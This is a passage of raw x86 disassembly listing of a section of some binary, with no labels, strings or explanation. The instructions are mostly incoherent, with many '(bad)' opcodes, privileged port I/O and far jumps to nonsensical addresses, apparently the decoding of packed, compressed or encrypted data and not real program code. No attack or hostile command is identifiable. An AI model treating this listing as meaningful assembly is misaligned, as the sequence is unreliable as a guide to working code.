  41182e:	ds add al,0x3e
  411831:	xchg   esp,eax
  411832:	mov    eax,ds:0xb3531dba
  411837:	add    DWORD PTR [ecx-0x4a98a857],eax
  41183d:	out    dx,eax
  41183e:	pop    ds
  41183f:	adc    bl,al
  411841:	js     0x411816
  411843:	cmp    ecx,ebx
  411845:	rcr    ebp,1
  411847:	shl    cl,cl
  411849:	add    DWORD PTR [eax],ebp
  41184b:	(bad)  
  41184c:	loop   0x4117f6
  41184e:	add    bh,bh
  411850:	mov    DWORD PTR [ebp-0x15a99ce4],0xa15ab7e7
  41185a:	aam    0xbf
  41185c:	sub    cl,dh
  41185e:	shl    cl,0x27
  411861:	push   0xdfd54827
  411866:	fwait
  411867:	shl    DWORD PTR [edx+0x2e52367f],0xd
  41186e:	pop    esi
  41186f:	sbb    DWORD PTR [eax-0x5c],esp
  411872:	stc    
  411873:	and    al,0x55
  411875:	or     edi,DWORD PTR [eax-0x36bbd88c]
  41187b:	fwait
  41187c:	pop    ebp
  41187d:	stos   BYTE PTR es:[edi],al
  41187e:	inc    DWORD PTR [ebx-0x78]
  411881:	push   edi
  411882:	sub    esi,esp
  411884:	and    eax,0x660d44ac
  411889:	jno    0x411869
  41188b:	and    al,0x7b
  41188d:	popa   
  41188e:	in     eax,dx
  41188f:	aam    0xe3
  411891:	pop    ecx
  411892:	lock mov al,ds:0x8e3c184c
  411898:	inc    edx
  411899:	jno    0x411873
  41189b:	pop    ss
  41189c:	sbb    eax,0xb27b6999
  4118a1:	imul   esi,DWORD PTR [eax+ecx*2-0x424c4e2e],0x45
  4118a9:	sub    al,0x54
  4118ab:	fsub   st(2),st
  4118ad:	in     eax,dx
  4118ae:	jge    0x4118ea
  4118b0:	ss add al,0xe9
  4118b3:	jg     0x41188b
  4118b5:	mov    al,0xed
  4118b7:	mov    bh,0x8f
  4118b9:	adc    eax,0x9c09f118
  4118be:	push   ebp
  4118bf:	test   al,0x46
  4118c1:	jg     0x411892
  4118c3:	and    ch,BYTE PTR [edi]
  4118c5:	(bad)  
  4118c6:	and    al,0xaf
  4118c8:	int    0x18
  4118ca:	jge    0x4118f9
  4118cc:	jo     0x411948
  4118ce:	outs   dx,DWORD PTR ds:[esi]
  4118cf:	cmp    al,0xe4
  4118d1:	push   edx
  4118d2:	clc    
  4118d3:	inc    esi
  4118d4:	mov    bh,0xbf
  4118d6:	inc    esi
  4118d7:	punpckldq mm0,DWORD PTR [ebp+eax*2-0x6a]
  4118dc:	jmp    0x2369f694
  4118e1:	loop   0x41187d
  4118e3:	jbe    0x411907
  4118e5:	xchg   edi,eax
  4118e6:	popa   
  4118e7:	bound  edx,QWORD PTR [ebp+0x5d9952c]
  4118ed:	loopne 0x411874
  4118ef:	dec    ebx
  4118f0:	pop    ds
  4118f1:	scas   al,BYTE PTR es:[edi]
  4118f2:	pop    ecx
  4118f3:	sbb    ebx,ebp
  4118f5:	mov    eax,ds:0x40b95dfd
  4118fa:	test   DWORD PTR [ebx+0x78],edi
  4118fd:	mov    BYTE PTR [esi+0x71],dh
  411900:	cmp    ah,BYTE PTR [edx+0x22eee236]
  411906:	pop    ss
  411907:	sbb    esi,ebx
  411909:	mov    edx,0x297e5b68
  41190e:	std    
  41190f:	inc    eax
  411910:	mov    dl,BYTE PTR [ebx-0x7f1fa70]
  411916:	xchg   esi,eax
  411917:	scas   al,BYTE PTR es:[edi]
  411918:	inc    edi
  411919:	call   0x654fd9f9
  41191e:	addr16 fnop 
  411921:	mov    esi,0xd48e0c18
  411926:	and    BYTE PTR [edx+edi*8],al
  411929:	hlt    
  41192a:	mov    bl,0x7e
  41192c:	fwait
  41192d:	ds stos DWORD PTR es:[edi],eax
  41192f:	jae    0x41190c
  411931:	mov    edi,0xf7eb5cb9
  411936:	dec    edx
  411937:	fisttp WORD PTR [ebp-0x7c]
  41193a:	(bad)  
  41193b:	cmc    
  41193c:	adc    al,0x7
  41193e:	add    bl,BYTE PTR [eax+0x13]
  411941:	xchg   DWORD PTR [eax+0x4361713a],edi
  411947:	or     DWORD PTR [eax+0x6b3f9cc8],esp
  41194d:	lods   eax,DWORD PTR ds:[esi]
  41194e:	out    0xfa,eax
  411950:	and    BYTE PTR [esi-0xea35109],al
  411956:	shl    DWORD PTR [ecx-0xa],1
  411959:	test   DWORD PTR [ebx-0x26],ecx
  41195c:	inc    eax
  41195d:	lea    eax,[edi]
  41195f:	inc    esp
  411960:	mov    ebp,0x1b0fe03e
  411965:	add    eax,0x2ffa2a53
  41196a:	mov    al,0xe4
  41196c:	pop    edi
  41196d:	fidiv  WORD PTR [eax-0x7bc8f795]
  411973:	test   al,0xac
  411975:	cmp    BYTE PTR [ebp-0x5d],bh
  411978:	mov    BYTE PTR [esp+esi*4-0x5673d64],cl
  41197f:	sbb    eax,0xa04b0a1e
  411984:	jmp    0x1f765c54
  411989:	sub    BYTE PTR [esi+ebp*8+0x7b56a62b],cl
  411990:	aam    0xc8
  411992:	div    DWORD PTR [edx-0x4d8a34d3]
  411998:	inc    edx
  411999:	popf   
  41199a:	das    
  41199b:	push   ss
  41199c:	xor    dl,ch
  41199e:	stc    
  41199f:	jmp    0x411a0c
  4119a1:	out    dx,eax
  4119a2:	mov    al,0x3
  4119a4:	jmp    ebx
  4119a6:	push   cs
  4119a7:	sbb    BYTE PTR [esi-0x6],al
  4119aa:	xor    BYTE PTR [ecx+ebx*8+0x5a36e4c8],bh
  4119b1:	adc    BYTE PTR [esi-0x64bd74e7],ch
  4119b7:	scas   al,BYTE PTR es:[edi]
  4119b8:	sahf   
  4119b9:	push   ds
  4119ba:	(bad)  [esp+eiz*2]
  4119bd:	call   0x4a88f2e6
  4119c2:	loopne 0x4119c3
  4119c4:	stc    
  4119c5:	pop    esp
  4119c6:	aas    
  4119c7:	add    BYTE PTR [eax+edx*8],0x91
  4119cb:	popa   
  4119cc:	xchg   esp,eax
  4119cd:	lods   al,BYTE PTR ds:[esi]
  4119ce:	(bad)  
  4119cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119d0:	in     al,0x60
  4119d2:	pop    ebp
  4119d3:	fwait
  4119d4:	jne    0x411a3a
  4119d6:	cmp    BYTE PTR [esi-0x462e1b7f],0x31
  4119dd:	lea    edx,[edi]
  4119df:	jle    0x411a51
  4119e1:	push   esp
  4119e2:	pushf  
  4119e3:	scas   eax,DWORD PTR es:[edi]
  4119e4:	push   0xf61b7354
  4119e9:	push   eax
  4119ea:	jp     0x41197c
  4119ec:	test   BYTE PTR [ebx-0x1539d3b7],0xd4
  4119f3:	jmp    0x7bd65889
  4119f8:	inc    cx
  4119fa:	adc    edx,edx
  4119fc:	pop    ss
  4119fd:	std    
  4119fe:	(bad)
  411a01:	jb     0x4119ef
  411a03:	push   ebx
  411a04:	and    BYTE PTR [eax+0xd6fc02e],bl
  411a0a:	sbb    DWORD PTR [ebp-0x2a],eax
  411a0d:	and    al,0x9
  411a0f:	out    dx,al
  411a10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a11:	rep outs dx,DWORD PTR ds:[esi]
  411a13:	xchg   ebp,eax
  411a14:	sub    BYTE PTR [edx],ch
  411a16:	xchg   ebx,eax
  411a17:	pop    esi
  411a18:	jmp    0x411a37
  411a1a:	jae    0x411a2a
  411a1c:	cmp    al,BYTE PTR ds:0x26ba64fe
  411a22:	in     al,0x84
  411a24:	leave  
  411a25:	gs mov ah,0x87
  411a28:	(bad)  
  411a29:	mov    ebx,0x3fd601b8
  411a2e:	and    eax,0x3e182bb6
  411a33:	and    eax,0xf1801b4f
  411a38:	lahf   
  411a39:	sub    BYTE PTR [edx-0x3f],ch
  411a3c:	dec    eax
  411a3d:	shl    eax,1
  411a3f:	mov    ch,0xe4
  411a41:	loop   0x411a28
  411a43:	(bad)  
  411a44:	inc    esi
  411a45:	leave  
  411a46:	inc    eax
  411a47:	test   al,0x61
  411a49:	adc    eax,0x350002bc
  411a4e:	leave  
  411a4f:	jb     0x411a7f
  411a51:	pushf  
  411a52:	inc    edx
  411a53:	pop    ebp
  411a54:	div    BYTE PTR [edx]
  411a56:	mov    ah,0xa1
  411a58:	pop    edi
  411a59:	mov    eax,0xeabc8a41
  411a5e:	inc    edi
  411a5f:	das    
  411a60:	sub    al,0x66
  411a62:	dec    esi
  411a63:	pop    esi
  411a64:	dec    edx
  411a65:	shr    BYTE PTR [eax-0x68],cl
  411a68:	(bad)  
  411a69:	loope  0x411ac5
  411a6b:	pop    ecx
  411a6c:	or     ah,BYTE PTR [ebx-0x227dd00e]
  411a72:	jno    0x411a69
  411a74:	cli    
  411a75:	push   0x99e3c824
  411a7a:	icebp  
  411a7b:	add    al,0xc6
  411a7d:	int    0xf1
  411a7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a80:	dec    ebp
  411a81:	gs cmp eax,0xd42ad052
  411a87:	sbb    edx,DWORD PTR [ecx]
  411a89:	xlat   BYTE PTR ds:[ebx]
  411a8a:	or     eax,0xfacde64a
  411a8f:	inc    ebp
  411a90:	ins    DWORD PTR es:[edi],dx
  411a91:	shr    al,0xce
  411a94:	aas    
  411a95:	jp     0x411a58
  411a97:	sahf   
  411a98:	pop    edi
  411a99:	push   DWORD PTR [edi]
  411a9b:	retf   0x9fbe
  411a9e:	ror    BYTE PTR [ecx-0x2d],cl
  411aa1:	sub    eax,0xab3a147d
  411aa6:	adc    BYTE PTR [ebp+0x10921db7],cl
  411aac:	nop
  411aad:	pop    ebp
  411aae:	cs aad 0x2c
  411ab1:	repnz out 0xc4,al
  411ab4:	mov    WORD PTR [edi-0x4],?
  411ab7:	outs   dx,BYTE PTR ds:[esi]
  411ab8:	jb     0x411b37
  411aba:	mov    edi,0xe880d851
  411abf:	shl    DWORD PTR [edi],0x60
  411ac2:	jle    0x411a8d
  411ac4:	sahf   
  411ac5:	pop    esi
  411ac6:	out    dx,al
  411ac7:	and    BYTE PTR [esi+0x55423cbb],ah
  411acd:	fisub  WORD PTR [esi]
  411acf:	jo     0x411b06
  411ad1:	cwde   
  411ad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ad3:	jnp    0x411aab
  411ad5:	jecxz  0x411aba
  411ad7:	repnz mov ch,0x8e
  411ada:	mov    ebp,0xb57e7c91
  411adf:	sbb    ch,BYTE PTR [edi+0x3e7b1965]
  411ae5:	pop    esi
  411ae6:	test   al,0xe5
  411ae8:	popf   
  411ae9:	fadd   QWORD PTR [edx-0x78]
  411aec:	adc    esp,DWORD PTR [edx]
  411aee:	xchg   ebx,eax
  411aef:	xchg   edi,eax
  411af0:	mov    dl,0x95
  411af2:	mov    ch,0xd7
  411af4:	lods   eax,DWORD PTR ds:[esi]
  411af5:	call   0x66ec1349
  411afa:	inc    esp
  411afb:	sub    eax,0xec4f20a
  411b00:	pusha  
  411b01:	mov    DWORD PTR [edx],esp
  411b03:	fwait
  411b04:	jl     0x411b52
  411b06:	ret    0x5107
  411b09:	pop    esp
  411b0a:	or     al,0xd0
  411b0c:	shr    BYTE PTR [ecx+ebx*4],1
  411b0f:	adc    al,0xff
  411b11:	push   eax
  411b12:	dec    edx
  411b13:	rol    eax,1
  411b15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b16:	fstp   QWORD PTR [ebp-0x30]
  411b19:	xchg   esi,eax
  411b1a:	sub    DWORD PTR [esi+ecx*1],ecx
  411b1d:	xchg   edx,eax
  411b1e:	cmp    al,0xff
  411b20:	xchg   edi,eax
  411b21:	push   edx
  411b22:	icebp  
  411b23:	sbb    BYTE PTR [ebx-0x7232439e],ch
  411b29:	push   esp
  411b2a:	fadd   DWORD PTR [eax]
  411b2c:	mov    ebp,0x7969743a
  411b31:	inc    edx
  411b33:	add    ecx,DWORD PTR [ebx]
  411b35:	stos   DWORD PTR es:[edi],eax
  411b36:	xor    BYTE PTR [eax-0x39],0x45
  411b3a:	aad    0xc8
  411b3c:	sub    eax,0xf99dcfae
  411b41:	clc    
  411b42:	pop    ecx
  411b43:	loopne 0x411b22
  411b45:	pop    es
  411b46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b47:	loopne 0x411bad
  411b49:	xchg   BYTE PTR [ebp+0x18bddd6e],cl
  411b4f:	jp     0x411b24
  411b51:	pop    eax
  411b52:	out    dx,eax
  411b53:	dec    esi
  411b54:	pop    ecx
  411b55:	push   esi
  411b56:	cmp    eax,0x55976006
  411b5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b5c:	jbe    0x411bb1
  411b5e:	out    dx,eax
  411b5f:	out    dx,eax
  411b60:	popf   
  411b61:	mov    ds:0x33f7d3ed,al
  411b66:	pop    eax
  411b67:	xchg   esi,eax
  411b68:	fdivp  st(0),st
  411b6a:	fsubr  DWORD PTR [edx+0x30]
  411b6d:	fst    QWORD PTR [eax-0x63]
  411b70:	jbe    0x411bd2
  411b72:	loope  0x411b94
  411b74:	out    0xf3,eax
  411b76:	out    0x4b,al
  411b78:	hlt    
  411b79:	std    
  411b7a:	sub    eax,0xdc3a0eef
  411b7f:	adc    al,0x31
  411b81:	or     edi,DWORD PTR [edx-0x1379f3f1]
  411b87:	mov    edx,0x18b6a216
  411b8c:	out    dx,eax
  411b8d:	int    0xf6
  411b8f:	jmp    0x255b216f
  411b94:	scas   al,BYTE PTR es:[edi]
  411b95:	sub    eax,0x74d8303b
  411b9a:	dec    edx
  411b9b:	jno    0x411b4c
  411b9d:	jae    0x411bf6
  411b9f:	pushf  
  411ba0:	repnz or ch,BYTE PTR [eax]
  411ba3:	jne    0x411b9a
  411ba5:	dec    eax
  411ba6:	mov    eax,ds:0x987083cd
  411bab:	inc    esp
  411bac:	jge    0x411c1c
  411bae:	mov    esi,eax
  411bb0:	cmp    esp,DWORD PTR ds:0x40195dc0
  411bb6:	aad    0x46
  411bb8:	pop    esp
  411bb9:	xchg   esi,eax
  411bba:	fist   WORD PTR [ecx-0x7fa64878]
  411bc0:	inc    ebx
  411bc1:	(bad)  
  411bc3:	mov    cl,0xae
  411bc5:	aad    0x2e
  411bc7:	mov    eax,ds:0xdf549bd
  411bcc:	sub    eax,0xeccd6501
  411bd1:	add    bl,BYTE PTR [esi-0x72]
  411bd4:	inc    ebx
  411bd5:	sub    al,0xea
  411bd7:	in     al,0x70
  411bd9:	test   eax,0xdd9a67d1
  411bde:	fs add al,0x1a
  411be1:	aam    0xa
  411be3:	cmp    ecx,ebx
  411be5:	out    0x47,al
  411be7:	dec    edx
  411be8:	stc    
  411be9:	fnstsw WORD PTR [edx+0x53]
  411bec:	loopne 0x411b94
  411bee:	mov    bh,0xc4
  411bf0:	push   cs
  411bf1:	or     BYTE PTR [edx-0x3a],al
  411bf4:	test   BYTE PTR [edi+ebx*8],al
  411bf7:	and    bh,ah
  411bf9:	aas    
  411bfa:	pop    ebp
  411bfb:	pop    esp
  411bfc:	aaa    
  411bfd:	cmp    BYTE PTR [eax+0x29],cl
  411c00:	(bad)  
  411c01:	push   ebx
  411c02:	mov    DWORD PTR [eax+0x4852b176],ecx
  411c08:	sbb    al,0xd5
  411c0a:	dec    ecx
  411c0b:	jp     0x411c39
  411c0d:	out    dx,eax
  411c0e:	jle    0x411c0d
  411c10:	mov    ah,0x34
  411c12:	fwait
  411c13:	daa    
  411c14:	xor    ch,BYTE PTR [edx+0x9]
  411c17:	lock gs scas al,BYTE PTR es:[edi]
  411c1a:	ret    
  411c1b:	push   esi
  411c1c:	xor    eax,DWORD PTR [edx+0x45]
  411c1f:	pop    ds
  411c20:	xchg   esp,eax
  411c21:	push   0xffffff82
  411c23:	jmp    0x411be5
  411c25:	int    0xc3
  411c27:	leave  
  411c28:	cmp    ebp,eax
  411c2a:	mov    al,0xaf
  411c2c:	stos   BYTE PTR es:[edi],al
  411c2d:	adc    BYTE PTR [esi],ch
  411c2f:	call   0x8e639aab
  411c34:	add    esp,edx
  411c36:	add    eax,0x1c4e416
  411c3b:	and    cl,al
  411c3d:	jo     0x411c63
  411c3f:	push   cs
  411c40:	mov    edi,0x9673c893
  411c45:	mov    ebp,0x6b16e1f1
  411c4a:	rcr    esi,0x1b
  411c4d:	add    BYTE PTR [ebp-0x6b],cl
  411c50:	popf   
  411c51:	push   ebx
  411c52:	jbe    0x411c4c
  411c54:	sub    BYTE PTR [edx+edx*1],dh
  411c57:	adc    eax,0xe0d0417f
  411c5c:	mov    WORD PTR [ebp-0x59],fs
  411c5f:	setno  BYTE PTR [ebp+0x5d55ea3f]
  411c66:	mov    dl,BYTE PTR [ebp-0x65]
  411c69:	dec    ebx
  411c6a:	sbb    eax,0x4d11fd7c
  411c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c70:	je     0x411cf1
  411c72:	and    BYTE PTR [ebx-0x94094b8],bl
  411c78:	js     0x411c14
  411c7a:	repnz outs dx,BYTE PTR ds:[esi]
  411c7c:	inc    edi
  411c7d:	or     eax,0xb9d463aa
  411c82:	inc    ecx
  411c83:	cmp    eax,0x88782193
  411c88:	mov    DWORD PTR [esi-0x24ee775d],edi
  411c8e:	jmp    0x803:0xfe7d347d
  411c95:	dec    ebx
  411c96:	shl    DWORD PTR [eax+ebp*8],cl
  411c99:	cmp    eax,0x8eb43dcd
  411c9e:	mov    cs,WORD PTR [esi-0x5999d9d8]
  411ca4:	mov    ?,WORD PTR [ecx+0x3e]
  411ca7:	dec    esi
  411ca8:	aam    0x4e
  411caa:	sbb    DWORD PTR [esi+0x75],ebp
  411cad:	imul   esp,edx,0x88b217eb
  411cb3:	dec    esi
  411cb4:	dec    edx
  411cb5:	push   edx
  411cb6:	je     0x411ce4
  411cb8:	or     al,0x1
  411cba:	cld    
  411cbb:	cwde   
  411cbc:	(bad)  
  411cbd:	lahf   
  411cbe:	jmp    0xa4ef97cc
  411cc3:	xor    ch,ah
  411cc5:	sbb    BYTE PTR [edx-0x51],bl
  411cc8:	test   eax,0x1be1cc0a
  411ccd:	inc    ebp
  411cce:	mov    eax,0x1907f70
  411cd3:	add    ecx,eax
  411cd5:	sbb    ah,bl
  411cd7:	jge    0x411ca2
  411cd9:	stos   DWORD PTR es:[edi],eax
  411cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cdb:	inc    ecx
  411cdc:	cmp    DWORD PTR [ecx-0x29],edx
  411cdf:	pop    esi
  411ce0:	ins    DWORD PTR es:[edi],dx
  411ce1:	mov    bl,bh
  411ce3:	daa    
  411ce4:	hlt    
  411ce5:	mov    ebx,0x6e593b95
  411cea:	sbb    al,0xc0
  411cec:	mov    esi,0x57fd2b9f
  411cf1:	add    al,0x82
  411cf3:	cmc    
  411cf4:	stos   DWORD PTR es:[edi],eax
  411cf5:	mov    ch,0xfc
  411cf7:	popf   
  411cf8:	clc    
  411cf9:	or     ch,BYTE PTR [eax]
  411cfb:	out    0x72,al
  411cfd:	retf   0xa42d
  411d00:	push   0xffffffbe
  411d02:	jle    0x411d73
  411d04:	ficom  WORD PTR [ebx-0x8e87c9a]
  411d0a:	dec    eax
  411d0b:	mov    al,ds:0xaf95123a
  411d10:	cmp    ecx,DWORD PTR [ebx-0x5e]
  411d13:	adc    al,0x34
  411d15:	adc    bh,BYTE PTR [edx]
  411d17:	test   ecx,ebp
  411d19:	loopne 0x411ce0
  411d1b:	push   edi
  411d1c:	jo     0x411d27
  411d1e:	add    dl,BYTE PTR [esi]
  411d20:	js     0x411cde
  411d22:	mov    fs,WORD PTR [edi+0x10]
  411d25:	push   esp
  411d26:	cwde   
  411d27:	jmp    0x79ed:0xee496e43
  411d2e:	shr    BYTE PTR [esi-0x261ff4de],cl
  411d34:	sub    eax,0x29ad67b5
  411d39:	xor    cl,cl
  411d3b:	jmp    0xcd6250b1
  411d40:	int    0xcf
  411d42:	sti    
  411d43:	and    eax,0xa30de576
  411d48:	pop    es
  411d49:	xor    dh,dl
  411d4b:	xor    dh,BYTE PTR ds:[ecx+0x778ad4ee]
  411d52:	(bad)  
  411d53:	cdq    
  411d54:	fwait
  411d55:	sub    eax,0xe532269e
  411d5a:	inc    edx
  411d5b:	mov    fs,eax
  411d5d:	mov    al,0x2d
  411d5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d60:	rol    DWORD PTR [edi-0x77],cl
  411d63:	out    dx,eax
  411d64:	ds repnz cmc 
  411d67:	shl    eax,cl
  411d69:	imul   ebx,eax,0xf5c709bd
  411d6f:	pusha  
  411d70:	test   eax,0x2b3076e7
  411d75:	and    ebx,DWORD PTR [esi]
  411d77:	sub    eax,0x595a3805
  411d7c:	rol    BYTE PTR [ebx+0x69dae15c],1
  411d82:	adc    al,0x28
  411d84:	adc    BYTE PTR [ebx+0x3f2945ca],bl
  411d8a:	arpl   WORD PTR [ebx+0x19],bp
  411d8d:	(bad)  
  411d8e:	cmc    
  411d8f:	fidivr DWORD PTR [ebx-0x3f22a4cd]
  411d95:	ja     0x411d89
  411d97:	fucomp st(7)
  411d99:	jecxz  0x411d62
  411d9b:	outs   dx,DWORD PTR ss:[esi]
  411d9d:	icebp  
  411d9e:	cmc    
  411d9f:	dec    esi
  411da0:	jg     0x411d63
  411da2:	cmp    al,0x78
  411da4:	mov    al,0x92
  411da6:	inc    eax
  411da7:	popa   
  411da8:	test   DWORD PTR [eax+0x46e33101],esi
  411dae:	(bad)  
  411daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411db0:	retf   
  411db1:	xor    ecx,edi
  411db3:	and    DWORD PTR [edx+0x5f],ebx
  411db6:	pop    edi
  411db7:	pop    ss
  411db8:	xchg   edx,eax
  411db9:	pop    edi
  411dba:	scas   eax,DWORD PTR es:[edi]
  411dbb:	mov    dl,0x5a
  411dbd:	loope  0x411d8c
  411dbf:	mov    ah,0xca
  411dc1:	stc    
  411dc2:	add    ebp,0x20
  411dc5:	sbb    BYTE PTR [esi],al
  411dc7:	mov    ss,WORD PTR [edx+0x23b5403b]
  411dcd:	stos   DWORD PTR es:[edi],eax
  411dce:	or     eax,0x2a035d27
  411dd3:	or     edx,DWORD PTR [ebp+0x1c]
  411dd6:	shl    esi,cl
  411dd8:	jecxz  0x411e15
  411dda:	std    
  411ddb:	test   BYTE PTR [ecx+0x5d930710],bl
  411de1:	fwait
  411de2:	xor    esi,DWORD PTR [edx-0x18]
  411de5:	jno    0x411d76
  411de7:	scas   al,BYTE PTR es:[edi]
  411de8:	lods   al,BYTE PTR ds:[esi]
  411de9:	or     BYTE PTR [edx+ebp*4],0x79
  411ded:	(bad)  
  411dee:	mov    dl,0x23
  411df0:	inc    edi
  411df1:	ret    
  411df2:	loop   0x411d79
  411df4:	mov    edx,0x120d9586
  411df9:	sub    BYTE PTR [eax-0x1a],bh
  411dfc:	jecxz  0x411e6d
  411dfe:	mov    al,0x64
  411e00:	push   ebp
  411e01:	or     al,0x61
  411e03:	mov    ch,al
  411e05:	(bad)  
  411e06:	aaa    
  411e07:	stc    
  411e08:	outs   dx,BYTE PTR ds:[esi]
  411e09:	fnstsw WORD PTR [eax-0x2114126c]
  411e0f:	sbb    al,0x1d
  411e11:	jmp    0xcac1:0xc7ed66ed
  411e18:	pop    ebp
  411e19:	pop    ecx
  411e1a:	xor    edx,esi
  411e1c:	aas    
  411e1d:	inc    eax
  411e1e:	fild   WORD PTR [esp+eiz*4]
  411e21:	inc    DWORD PTR [esi+0x25]
  411e24:	mov    cl,0x9f
  411e26:	jmp    0x89be:0x2b4b89d5
  411e2d:	stc    
  411e2e:	stos   DWORD PTR es:[edi],eax
  411e2f:	sub    esp,DWORD PTR [eax+0xf72a5a8]
  411e35:	jne    0x411ea6
  411e37:	jl     0x411dbe
  411e39:	jge    0x411e61
  411e3b:	xor    eax,DWORD PTR [edx+0x17]
  411e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e3f:	nop
  411e40:	add    edi,DWORD PTR [ebp-0x44]
  411e43:	(bad)  
  411e44:	and    eax,0x7e0f75bf
  411e49:	mov    BYTE PTR [edx-0x1f],bh
  411e4c:	aaa    
  411e4d:	sub    esi,esp
  411e4f:	arpl   WORD PTR [esi+0xf032986],di
  411e55:	mov    eax,ebx
  411e57:	push   esi
  411e58:	push   ebx
  411e59:	stos   DWORD PTR es:[edi],eax
  411e5a:	ret    0x1ceb
  411e5d:	add    cl,bh
  411e5f:	dec    ebx
  411e60:	out    0x51,eax
  411e62:	and    ah,BYTE PTR [esi-0x8]
  411e65:	(bad)  
  411e66:	push   es
  411e67:	fnstenv [edx+0x12]
  411e6a:	enter  0x3622,0x9c
  411e6e:	sbb    ecx,eax
  411e70:	in     eax,0x19
  411e72:	daa    
  411e73:	pop    eax
  411e74:	mov    al,0x49
  411e76:	mov    bh,0x54
  411e78:	xor    DWORD PTR [eax+0x3d],ebp
  411e7b:	jge    0x411e61
  411e7d:	outs   dx,DWORD PTR ds:[esi]
  411e7e:	pop    esp
  411e7f:	int    0x77
  411e81:	xchg   DWORD PTR [ecx-0x4],edx
  411e84:	ins    BYTE PTR es:[edi],dx
  411e85:	(bad)  [edi+0x64]
  411e88:	push   ebp
  411e89:	popa   
  411e8a:	fnstenv [edi+0x40444059]
  411e90:	cld    
  411e91:	push   esp
  411e92:	or     ebp,edx
  411e94:	dec    eax
  411e95:	pop    ds
  411e96:	out    0xb2,eax
  411e98:	cmc    
  411e99:	mov    al,0xde
  411e9b:	mov    dl,0xbf
  411e9d:	jnp    0xb22ac62c
  411ea3:	aam    0x2c
  411ea5:	loopne 0x411e5d
  411ea7:	retf   0x8009
  411eaa:	xchg   edi,eax
  411eab:	mov    dl,0xeb
  411ead:	stos   BYTE PTR es:[edi],al
  411eae:	pop    es
  411eaf:	add    ch,BYTE PTR [ecx+0x52ee84c8]
  411eb5:	mov    esp,0xea5e0de0
  411eba:	add    BYTE PTR [ebp+0x6d550b],0x6b
  411ec1:	out    0xc8,eax
  411ec3:	repnz pop ecx
  411ec5:	lods   eax,DWORD PTR ds:[esi]
  411ec6:	sar    DWORD PTR [edx-0x65],cl
  411ec9:	mov    dl,0x99
  411ecb:	shl    DWORD PTR [ebp+0x26],cl
  411ece:	dec    edi
  411ecf:	adc    eax,0xfde03406
  411ed4:	cmp    eax,0x5f166836
  411ed9:	mov    ecx,eax
  411edb:	aas    
  411edc:	fstp   st(2)
  411ede:	xchg   ebp,eax
  411edf:	jnp    0x411eb5
  411ee1:	or     eax,0xf81d6cda
  411ee6:	jg     0x411ef9
  411ee8:	xlat   BYTE PTR ds:[ebx]
  411ee9:	pop    ebp
  411eea:	icebp  
  411eeb:	mov    BYTE PTR [edi],dl
  411eed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411eee:	stos   DWORD PTR es:[edi],eax
  411eef:	inc    ebp
  411ef0:	or     eax,0x9412fc5c
  411ef5:	fs push ds
  411ef7:	jmp    0x602d:0xfad65bd1
  411efe:	mov    ecx,0xb04b9dcd
  411f03:	and    dh,cl
  411f05:	dec    eax
  411f06:	inc    ebx
  411f07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f08:	iret   
  411f09:	push   edi
  411f0a:	scas   eax,DWORD PTR es:[edi]
  411f0b:	sbb    esi,edx
  411f0d:	and    al,0x15
  411f0f:	leave  
  411f10:	mov    bh,0x67
  411f12:	xchg   edi,eax
  411f13:	(bad)  
  411f14:	cld    
  411f15:	jae    0x411efc
  411f17:	pop    ecx
  411f18:	jmp    0xa775:0x3b3aec50
  411f1f:	rcl    cl,1
  411f21:	test   BYTE PTR [edx+0xa2d1ec7],0xa0
  411f28:	xchg   DWORD PTR [eax-0xf],ecx
  411f2b:	xor    al,0xde
  411f2d:	int    0x25
  411f2f:	push   0xffffffff
  411f31:	dec    edi
  411f32:	retf   
  411f33:	(bad)  
  411f34:	das    
  411f35:	mov    esp,0x5011bf0f
  411f3a:	cmp    eax,0x409c2844
  411f3f:	leave  
  411f40:	aam    0x2b
  411f42:	xor    eax,0x62adaf39
  411f47:	push   0xf63f5a81
  411f4c:	shl    ah,cl
  411f4e:	mov    DWORD PTR [ecx+ebx*4],ebx
  411f51:	mov    ebx,DWORD PTR [ebx+esi*1+0x6a23a566]
  411f58:	mul    DWORD PTR [edx]
  411f5a:	sub    edi,DWORD PTR [ecx]
  411f5c:	test   eax,0x597923d1
  411f61:	ficomp WORD PTR [edi-0x6dca4abe]
  411f67:	icebp  
  411f68:	lods   al,BYTE PTR ds:[esi]
  411f69:	add    BYTE PTR [ecx-0x5a],dh
  411f6c:	jle    0xecce1217
  411f72:	call   0x9470:0x8ecfaa20
  411f79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f7a:	mov    ah,0xf9
  411f7c:	or     al,0xe9
  411f7e:	lds    ebx,FWORD PTR [ecx]
  411f80:	dec    ecx
  411f81:	and    BYTE PTR [ebp-0x7d],ah
  411f84:	ds or  bl,cl
  411f87:	test   al,0xff
  411f89:	div    BYTE PTR [bp+di]
  411f8c:	aas    
  411f8d:	stos   BYTE PTR es:[edi],al
  411f8e:	jns    0x41200d
  411f90:	inc    ecx
  411f91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f92:	mov    edx,0x518b4415
  411f97:	push   ss
  411f98:	pop    ds
  411f99:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  411f9b:	jnp    0x411f24
  411f9d:	clc    
  411f9e:	out    dx,eax
  411f9f:	jae    0x411fdd
  411fa1:	push   edx
  411fa2:	push   ss
  411fa3:	jle    0x411fc1
  411fa5:	ja     0x411fad
  411fa7:	mov    eax,0x4aa73b1d
  411fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fad:	xlat   BYTE PTR ds:[ebx]
  411fae:	and    al,0x4e
  411fb0:	ins    BYTE PTR es:[edi],dx
